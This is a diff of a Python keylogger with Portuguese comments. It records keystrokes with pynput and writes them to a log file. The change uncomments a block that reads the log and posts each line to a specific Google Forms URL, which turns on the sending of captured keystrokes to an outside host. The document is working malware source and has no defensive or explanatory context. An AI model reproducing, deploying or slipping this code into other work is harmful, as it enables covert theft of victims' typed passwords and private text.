@@ -40,7 +40,7 @@ def escreva(Letra):
 
 	with open(logFile, "a") as n:
 		n.write(escrita)
-'''
+
 		arquivo = open('/home/znt/Documentos/log.txt', 'r')
 		for linha in arquivo:
 			print(linha)
@@ -49,7 +49,7 @@ def escreva(Letra):
 		payload = {'entry.722472479': linha}
 
 		r = requests.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSdPA5fhRbhgxWwNyNUdY7HcuK02kHyuT2IPwBy4kEuyvHn05w/formResponse", data=payload)
-'''
+
 # E esse roda o keylogger
 with Listener(on_press=escreva) as x:
 	x.join()
